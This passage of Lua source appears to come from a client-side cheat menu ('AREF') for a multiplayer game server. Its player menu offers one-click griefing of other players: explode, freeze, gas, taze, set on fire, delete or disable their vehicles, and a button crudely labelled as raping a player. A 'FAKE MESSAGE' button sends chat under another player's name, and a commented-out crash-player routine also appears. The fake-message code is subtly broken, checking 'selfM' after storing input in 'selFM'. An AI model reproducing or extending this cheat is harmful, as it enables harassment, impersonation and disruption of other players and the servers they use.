                    local y = self:TranslateScroller(self.Config.MenuY + 68, scroller_size, scroller_pos)
   
                    scrolling = true
   
                    scroller_pos = self:Clamp(y, 0, self.MenuH - 120 - scroller_size)
   
                else
   
                    scroller_y = nil
   
                    scrolling = false
   
                end
   
            else
   
                self.Painter:DrawText("Selected: " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SelectedPlayer)) .. " (ID: " .. self:GetFunction("GetPlayerServerId")(self.SelectedPlayer) .. ")", 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 67, 0.35, 255, 255, 255, 255)
   
                local curY = 3
   
    
   
                if self.Painter:Button("BACK", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "go_back", false, 0.35) then
   
                    self.SelectedPlayer = nil
   
                    halt = true
   
                end
   
    
   
                if not halt then
   
                    curY = curY + 20
   
                    local spectate_text = ""
   
    
   
                    if self.SpectatingPlayer and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
   
                        spectate_text = " [SPECTATING: " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SpectatingPlayer)) .. "]"
   
                    end
   
    
   
                    local track_text = ""
   
    
   
                    if self.TrackingPlayer and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
   
                        track_text = " [TRACKING: " .. self:CleanName(self:GetFunction("GetPlayerName")(self.TrackingPlayer)) .. "]"
   
                    end
   
    
   
                    if self.SelectedPlayer ~= self.NetworkID then
   
                        if self.Painter:Button("TELEPORT", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "teleport_player", false, 0.35) then
   
                            local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)
   
                            local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
                            self:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)
   
    
   
                            if self:GetFunction("IsPedInAnyVehicle")(ped) and self:GetFunction("AreAnyVehicleSeatsFree")(self:GetFunction("GetVehiclePedIsIn")(ped)) then
   
                                self:GetFunction("SetPedIntoVehicle")(self.LocalPlayer, self:GetFunction("GetVehiclePedIsIn")(ped), -2)
   
                            else
   
                                self:GetFunction("SetEntityCoords")(self.LocalPlayer, coords.x, coords.y, coords.z, false, false, false, false)
   
                            end
   
    
   
                            self:AddNotification("SUCCESS", "Teleported to player.")
   
                        end
   
    
   
                        curY = curY + 20
   
                    end
   
    
   
                    if self.SelectedPlayer ~= self.NetworkID then
   
                        if self.Painter:Button("TRACK" .. track_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "track_player", false, 0.35) then
   
                            if self.TrackingPlayer ~= nil and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
   
                                self:AddNotification("INFO", "Stopped tracking " .. self:CleanName(self:GetFunction("GetPlayerName")(self.TrackingPlayer)))
   
                                self.TrackingPlayer = nil
   
                            else
   
                                self.TrackingPlayer = self.SelectedPlayer
   
                                self:AddNotification("INFO", "Tracking " .. self:CleanName(self:GetFunction("GetPlayerName")(self.TrackingPlayer)), 10000)
   
                            end
   
                        end
   
    
   
                        curY = curY + 20
   
                    end
   
    
   
                    if self.SelectedPlayer ~= self.NetworkID then
   
                        if self.Painter:Button("SPECTATE" .. spectate_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "spectate_player", false, 0.35) then
   
                            if self.SpectatingPlayer ~= nil and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
   
                                self:AddNotification("INFO", "Stopped spectating " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SpectatingPlayer)))
   
                                self:Spectate(false)
   
                            else
   
                                self:Spectate(self.SelectedPlayer)
   
                                self:AddNotification("INFO", "Spectating " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SpectatingPlayer)), 10000)
   
                            end
   
                        end
   
    
   
                        curY = curY + 20
   
                    end
   
    
   
                    if self.Painter:Button("EXPLODE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "explode_player", false, 0.35) then
   
                        if self.Config.SafeMode then
   
                            self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                        else
   
                            self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
   
                            self:AddNotification("INFO", "Player blown up.", 10000)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button(dict.frozen_players[self.SelectedPlayer] and "UNFREEZE" or "FREEZE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "freeze_player", false, 0.35) then
   
                        if self.Config.SafeMode then
   
                            self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                        else
   
                            dict.frozen_players[self.SelectedPlayer] = not dict.frozen_players[self.SelectedPlayer]
   
                            self:AddNotification("INFO", "Player " .. (dict.frozen_players[self.SelectedPlayer] and "frozen" or "unfrozen") .. ".", 10000)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("GIVE ALL WEAPONS", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "give_player_all_weapons", false, 0.35) then
   
                        if self.Config.SafeMode then
   
                            self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                        else
   
                            local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)
   
    
   
                            for _, wep in dict.pairs(all_weapons) do
   
                                self:GetFunction("GiveWeaponToPed")(ped, self:GetFunction("GetHashKey")(wep), 9000, false, true)
   
                            end
   
    
   
                            self:AddNotification("SUCCESS", "All weapons given.", 10000)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("GIVE SPECIFIC", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "give_player_specific", false, 0.35) then
   
                        if self.Config.SafeMode then
   
                            self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                        else
   
                            local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)
   
                            self:DoGiveWeaponUI(ped)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("SPAWN PROP (SHIFT FOR ATTACH)", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "spawn_object", false, 0.35) then
   
                        local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)
   
                        self:DoSpawnObjectUI(ped)
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("GAS PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "gas_player", false, 0.35) then
   
                        self:GasPlayer(self.SelectedPlayer)
   
    
   
                        if not self.Config.SafeMode then
   
                            self:AddNotification("SUCCESS", "Player gassed!", 10000)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("TAZE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "taze_player", false, 0.35) then
   
                        self:TazePlayer(self.SelectedPlayer)
   
                        self:AddNotification("SUCCESS", "Player tazed!", 10000)
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("HYDRANT PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "hydrant_player", false, 0.35) then
   
                        self:HydrantPlayer(self.SelectedPlayer)
   
                        self:AddNotification("SUCCESS", "Player sprayed!", 10000)
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("FIRE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fire_player", false, 0.35) then
   
                        self:FirePlayer(self.SelectedPlayer)
   
                        self:AddNotification("SUCCESS", "Player set on fire!", 10000)
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("KICK FROM VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "kick_player_car", false, 0.35) then
   
                        if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
   
                            self:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
   
                        else
   
                            if self.Config.SafeMode then
   
                                self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                            else
   
                                self:GetFunction("ClearPedTasksImmediately")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer))
   
                                self:AddNotification("SUCCESS", "Player kicked from vehicle!", 5000)
   
                            end
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("DISABLE VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "disable_player_car", false, 0.35) then
   
                        if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
   
                            self:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
   
                        else
   
                            self:AddNotification("SUCCESS", "Disabling vehicle.", 5000)
   
                            self:DisableVehicle(self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)))
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("DELETE VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "delete_player_car", false, 0.35) then
   
                        if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
   
                            self:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
   
                        else
   
                            CreateThread(function()
   
                                self:AddNotification("SUCCESS", "Deleting vehicle.", 5000)
   
    
   
                                if not self:RequestControlSync(self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer))) then
   
                                    self:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000)
   
                                else
   
                                    self.Util:DeleteEntity(self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)))
   
                                end
   
                            end)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("CLONE VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "clone_player_car", false, 0.35) then
   
                        if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
   
                            self:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
   
                        else
   
                            local entity = self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer))
   
                            self:SpawnLocalVehicle(self:GetFunction("GetEntityModel")(entity), false, true)
   
                            self:AddNotification("SUCCESS", "Vehicle cloned!", 5000)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("RAPE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "rape_player", false, 0.35) then
   
                        self:RapePlayer(self.SelectedPlayer)
   
    
   
                        if not self.Config.SafeMode then
   
                            self:AddNotification("SUCCESS", "Player raped!", 10000)
   
                        end
   
                    end
   
    
   
                    curY = curY + 20
   
                    local friend_text = dict.friends[self:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] and "REMOVE FRIEND" or "MARK AS FRIEND"
   
    
   
                    if self.Painter:Button(friend_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "friend_toggle", false, 0.35) then
   
                        dict.friends[self:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] = not dict.friends[self:GetFunction("GetPlayerServerId")(self.SelectedPlayer)]
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.Painter:Button("STEAL OUTFIT", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "steal_player_outfit", false, 0.35) then
   
                        local p_ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)
   
                        local mdl = self:GetFunction("GetEntityModel")(p_ped)
   
    
   
                        if self:GetFunction("GetEntityModel")(self.LocalPlayer) ~= mdl then
   
                            self:GetFunction("SetPlayerModel")(self.NetworkID, mdl)
   
                        end
   
    
   
                        self:StealOutfit(self.LocalPlayer, p_ped)
   
                        self:AddNotification("SUCCESS", "Outfit stolen.", 5000)
   
                    end
   
    
   
                    curY = curY + 20
   
    
   
                    if self.DynamicTriggers["chat"] and self.DynamicTriggers["chat"]["_chat:messageEntered"] then
   
                        if self.Painter:Button("FAKE MESSAGE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fake_chat_message", false, 0.35) then
   
                            local selFM = self:GetTextInput("Enter message to send.", "", 100)
   
                            local playa = self:GetFunction("GetPlayerName")(self.SelectedPlayer)
   
    
   
                            if selfM then
   
                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["chat"]["_chat:messageEntered"], playa, {0, 0x99, 255}, selfM)
   
                                self:AddNotification("SUCCESS", "Message sent!", 10000)
   
                            end
   
                        end
   
    
   
                        curY = curY + 20
   
                    end
   
                    -- if self.Painter:Button("~r~CRASH PLAYER (SHIFT FOR METHOD)", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "crash_online_player", false, 0.35) then
   
                    -- 	local method = nil
   
                    -- 	if self.Config.SafeMode then
   
                    -- 		self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                    -- 	else
   
                    -- 		if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                    -- 			local _method = self:GetTextInput("Enter crash method. [object / ped / both]", "both", 10)
   
                    -- 			if _method then
   
                    -- 				method = _method
   
                    -- 				self:AddNotification("INFO", "Using " .. method .. " crash method.")
   
                    -- 			end
   
                    -- 		end
   
                    -- 		self:CrashPlayer(self.SelectedPlayer, nil, method)
   
                    -- 	end
   
                    -- end
   
                end
   
            end
   
    
   
            local curX = self.Config.MenuX + 7
   
    
   
            for _, data in dict.ipairs(self.Categories) do
   
                local size = self.Painter:GetTextWidth(data.Title, 4, 0.34)
   
    
   
                if self.Painter:ListItem(data.Title, curX, self.Config.MenuY + 26, 0, 0, size + 28.6, 20, 0, 0, 0, 200, "category_" .. _) then
   
                    self.Config.CurrentSelection = _
   
                    self.Config.SelectedCategory = "category_" .. _
   
    
   
                    if data.Title ~= "~r~KILL" then
   
                        self.ConfigClass.Save(true)
   
                    end
   
                end
   
    
   
                curX = curX + size + 28.6 + 2
   
            end
   
    
   
            if self.Config.CurrentSelection and self.Categories[self.Config.CurrentSelection] then
   
                self.Categories[self.Config.CurrentSelection].Build(self, self.Config.MenuX + 5, self.Config.MenuY + 46, 515 + 113, self.MenuH - 28)
   
            else
   
                self.Config.CurrentSelection = 1
   
                self.Config.SelectedCategory = "category_1"
   
                self.ConfigClass.Save(true)
   
            end
   
        end
   
    
   
        local last_clean = 0
   
    
   
        function AREF:Cleanup()
   
            if last_clean <= self:GetFunction("GetGameTimer")() then
   
                last_clean = self:GetFunction("GetGameTimer")() + 15000
   
                collectgarbage("collect")
   
            end
   
        end
   
    
   
        local was_showing
   
        local was_invis
   
        local was_other_invis = {}
   
        local was_noragdoll
   
        local was_noclip
   
        local was_fastrun
   
        local was_thermal
   
        local walking
   
        local magic_carpet_obj
   
        local preview_magic_carpet
   
        local magic_riding
   
        local was_infinite_combat_roll
   
        local was_fakedead
   
        local fakedead_timer = 0
   
        local last_afk_move = 0
   
    
   
        CreateThread(function()
   
            while AREF.Enabled do
   
                Wait(0)
   
    
   
                if AREF.Config.Player.RevealInvisibles then
   
                    for id, src in dict.pairs(AREF.PlayerCache) do
   
                        src = dict.tonumber(src)
   
    
   
                        if src ~= AREF.NetworkID then
   
                            local _ped = AREF:GetFunction("GetPlayerPed")(src)
   
                            local where = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
   
                            local us = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(AREF.LocalPlayer, 0.0, 0.0, 0.0)
   
                            local dist = AREF:GetFunction("GetDistanceBetweenCoords")(where.x, where.y, where.z, us.x, us.y, us.z)
   
    
   
                            if dist <= 100.0 then
   
                                local invis = not AREF:GetFunction("IsEntityVisibleToScript")(_ped)
   
    
   
                                if invis then
   
                                    AREF:GetFunction("SetEntityLocallyVisible")(_ped, true)
   
                                    AREF:GetFunction("SetEntityAlpha")(_ped, 150)
   
                                    AREF:Draw3DText(where.x, where.y, where.z + 1.5, "*PLAYER INVISIBLE*", 255, 55, 55, 255)
   
                                    was_other_invis[src] = true
   
                                else
   
                                    AREF:GetFunction("SetEntityAlpha")(_ped, 255)
   
                                    was_other_invis[src] = false
   
                                end
   
                            else
   
                                AREF:GetFunction("SetEntityAlpha")(_ped, 255)
   
                                was_other_invis[src] = false
   
                            end
   
                        end
   
                    end
   
                end
   
            end
   
        end)
   
    
   
        local give_asking_category
   
        local selected_give_cat = 1
   
        local selected_give_opt = 1
   
        local notif_alpha = 0
   
        local offX = 0
   
        local was_showing_give
   
        local _no_combat
   
        local _was_no_combat
   
    
   
        function AREF:DoGiveWeaponUI(ped)
   
            if ped then
   
                self.GivingWeaponTo = ped
   
                was_showing_give = self.Showing
   
                self.Showing = false
   
                _no_combat = true
   
                give_asking_category = true
   
                selected_give_cat = 1
   
                selected_give_opt = 1
   
            end
   
    
   
            if self.GivingWeaponTo then
   
                if not self:GetFunction("DoesEntityExist")(self.GivingWeaponTo) then
   
                    self.GivingWeaponTo = nil
   
                    self.Showing = was_showing_give
   
                    _no_combat = false
   
    
   
                    return
   
                end
   
    
   
                if self.Showing then return end
   
    
   
                if self.Config.ShowNotifications and notif_alpha > 0 then
   
                    offX = _lerp(0.1, offX, 429)
   
                else
   
                    offX = _lerp(0.1, offX, 0)
   
                end
   
    
   
                local sY = 30
   
                local max_opts = 30
   
                local cur_opt = (give_asking_category and selected_give_cat or selected_give_opt)
   
                local options = (give_asking_category and give_weapon_list or give_weapon_list[selected_give_cat].Weapons)
   
                local count = 0
   
                local total_opts = (#options or 0)
   
                local can_see = true
   
                self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Give Weapon (" .. cur_opt .. "/" .. total_opts .. ")", 4, false, self:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)
   
    
   
                if give_asking_category then
   
                    for id, val in dict.pairs(options or {}) do
   
                        if total_opts > max_opts then
   
                            can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
   
                        else
   
                            count = 0
   
                        end
   
    
   
                        if can_see and count <= 10 then
   
                            local r, g, b = 255, 255, 255
   
    
   
                            if cur_opt == id then
   
                                r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]
   
                            end
   
    
   
                            self.Painter:DrawText(val.Name, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
   
                            sY = sY + 20
   
                            count = count + 1
   
                        end
   
                    end
   
                else
   
                    for id, val in dict.pairs(options or {}) do
   
                        if total_opts > max_opts then
   
                            can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
   
                        else
   
                            count = 0
   
                        end
   
    
   
                        if can_see and count <= 10 then
   
                            local r, g, b = 255, 255, 255
   
    
   
                            if cur_opt == id then
   
                                r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]
   
                            end
   
    
   
                            self.Painter:DrawText(val, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
   
                            sY = sY + 20
   
                            count = count + 1
   
                        end
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then
   
                    if give_asking_category then
   
                        local new = selected_give_cat + 1
   
    
   
                        if options[new] then
   
                            selected_give_cat = new
   
                        else
   
                            selected_give_cat = 1
   
                        end
   
                    else
   
                        local new = selected_give_opt + 1
   
    
   
                        if options[new] then
   
                            selected_give_opt = new
   
                        else
   
                            selected_give_opt = 1
   
                        end
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then
   
                    if give_asking_category then
   
                        local new = selected_give_cat - 1
   
    
   
                        if options[new] then
   
                            selected_give_cat = new
   
                        else
   
                            selected_give_cat = #options
   
                        end
   
                    else
   
                        local new = selected_give_opt - 1
   
    
   
                        if options[new] then
   
                            selected_give_opt = new
   
                        else
   
                            selected_give_opt = #options
   
                        end
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then
   
                    if not give_asking_category then
   
                        give_asking_category = true
   
                        selected_give_opt = 1
   
                    else
   
                        self.Showing = was_showing_give
   
                        self.GivingWeaponTo = nil
   
                        selected_give_opt = 1
   
                        _no_combat = false
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then
   
                    if give_asking_category then
   
                        give_asking_category = false
   
                        selected_give_opt = 1
   
                    else
   
                        local weapon = options[cur_opt]
   
                        self:AddNotification("INFO", "Gave " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, weapon))
   
                        self:GetFunction("GiveWeaponToPed")(self.GivingWeaponTo, self:GetFunction("GetHashKey")(weapon), 500, false, true)
   
                    end
   
                end
   
    
   
                self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)
   
                self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 49, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)
   
            end
   
        end
   
    
   
        function AREF:DoTakeWeaponUI(ped)
   
            if ped then
   
                self.TakingWeaponFrom = ped
   
                was_showing_give = self.Showing
   
                self.Showing = false
   
                _no_combat = true
   
                give_asking_category = true
   
                selected_give_cat = 1
   
                selected_give_opt = 1
   
            end
   
    
   
            if self.TakingWeaponFrom then
   
                if not self:GetFunction("DoesEntityExist")(self.TakingWeaponFrom) then
   
                    self.TakingWeaponFrom = nil
   
                    self.Showing = was_showing_give
   
                    _no_combat = false
   
    
   
                    return
   
                end
   
    
   
                if self.Showing then return end
   
    
   
                if self.Config.ShowNotifications and notif_alpha > 0 then
   
                    offX = _lerp(0.1, offX, 429)
   
                else
   
                    offX = _lerp(0.1, offX, 0)
   
                end
   
    
   
                local sY = 30
   
                local max_opts = 30
   
                local cur_opt = (give_asking_category and selected_give_cat or selected_give_opt)
   
                local options = (give_asking_category and give_weapon_list or give_weapon_list[selected_give_cat].Weapons)
   
                local count = 0
   
                local total_opts = (#options or 0)
   
                local can_see = true
   
                self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Remove Weapon (" .. cur_opt .. "/" .. total_opts .. ")", 4, false, self:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)
   
    
   
                if give_asking_category then
   
                    for id, val in dict.pairs(options or {}) do
   
                        if total_opts > max_opts then
   
                            can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
   
                        else
   
                            count = 0
   
                        end
   
    
   
                        if can_see and count <= 10 then
   
                            local r, g, b = 255, 255, 255
   
    
   
                            if cur_opt == id then
   
                                r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]
   
                            end
   
    
   
                            self.Painter:DrawText(val.Name, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
   
                            sY = sY + 20
   
                            count = count + 1
   
                        end
   
                    end
   
                else
   
                    for id, val in dict.pairs(options or {}) do
   
                        if total_opts > max_opts then
   
                            can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
   
                        else
   
                            count = 0
   
                        end
   
    
   
                        if can_see and count <= 10 then
   
                            local r, g, b = 255, 255, 255
   
    
   
                            if cur_opt == id then
   
                                r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]
   
                            end
   
    
   
                            self.Painter:DrawText(val, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
   
                            sY = sY + 20
   
                            count = count + 1
   
                        end
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then
   
                    if give_asking_category then
   
                        local new = selected_give_cat + 1
   
    
   
                        if options[new] then
   
                            selected_give_cat = new
   
                        else
   
                            selected_give_cat = 1
   
                        end
   
                    else
   
                        local new = selected_give_opt + 1
   
    
   
                        if options[new] then
   
                            selected_give_opt = new
   
                        else
   
                            selected_give_opt = 1
   
                        end
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then
   
                    if give_asking_category then
   
                        local new = selected_give_cat - 1
   
    
   
                        if options[new] then
   
                            selected_give_cat = new
   
                        else
   
                            selected_give_cat = #options
   
                        end
   
                    else
   
                        local new = selected_give_opt - 1
   
    
   
                        if options[new] then
   
                            selected_give_opt = new
   
                        else
   
                            selected_give_opt = #options
   
                        end
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then
   
                    if not give_asking_category then
   
                        give_asking_category = true
   
                        selected_give_opt = 1
   
                    else
   
                        self.Showing = was_showing_give
   
                        self.TakingWeaponFrom = nil
   
                        selected_give_opt = 1
   
                        _no_combat = false
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then
   
                    if give_asking_category then
   
                        give_asking_category = false
   
                        selected_give_opt = 1
   
                    else
   
                        local weapon = options[cur_opt]
   
                        self:AddNotification("INFO", "Removed " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, weapon))
   
                        self:GetFunction("RemoveWeaponFromPed")(self.TakingWeaponFrom, self:GetFunction("GetHashKey")(weapon))
   
                    end
   
                end
   
    
   
                self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)
   
                self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 49, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)
   
            end
   
        end
   
    
   
        function AREF:DoSpawnObjectUI(ped, all)
   
            if ped or all then
   
                self.SpawnObjectOn = all and "all" or ped
   
                was_showing_give = self.Showing
   
                self.Showing = false
   
                _no_combat = true
   
                selected_give_opt = 1
   
            end
   
    
   
            if self.SpawnObjectOn then
   
                if self.SpawnObjectOn ~= "all" and not self:GetFunction("DoesEntityExist")(self.SpawnObjectOn) then
   
                    self.SpawnObjectOn = nil
   
                    self.Showing = was_showing_give
   
                    _no_combat = false
   
    
   
                    return
   
                end
   
    
   
                if self.Showing then return end
   
                if self.GivingWeaponTo then return end
   
                if self.TakingWeaponFrom then return end
   
    
   
                if self.Config.ShowNotifications and notif_alpha > 0 then
   
                    offX = _lerp(0.1, offX, 429)
   
                else
   
                    offX = _lerp(0.1, offX, 0)
   
                end
   
    
   
                local sY = 30
   
                local max_opts = 30
   
                local cur_opt = selected_give_opt
   
                local options = self.FreeCam.SpawnerOptions["OBJECT"]
   
                local count = 0
   
                local total_opts = (#options or 0)
   
                local can_see = true
   
                self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Spawn Object (" .. cur_opt .. "/" .. total_opts .. ")", 4, false, self:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)
   
    
   
                for id, val in dict.pairs(options or {}) do
   
                    if total_opts > max_opts then
   
                        can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
   
                    else
   
                        count = 0
   
                    end
   
    
   
                    if can_see and count <= 10 then
   
                        local r, g, b = 255, 255, 255
   
    
   
                        if cur_opt == id then
   
                            r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]
   
                        end
   
    
   
                        self.Painter:DrawText(val, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
   
                        sY = sY + 20
   
                        count = count + 1
   
                    end
   
                end
   
    
   
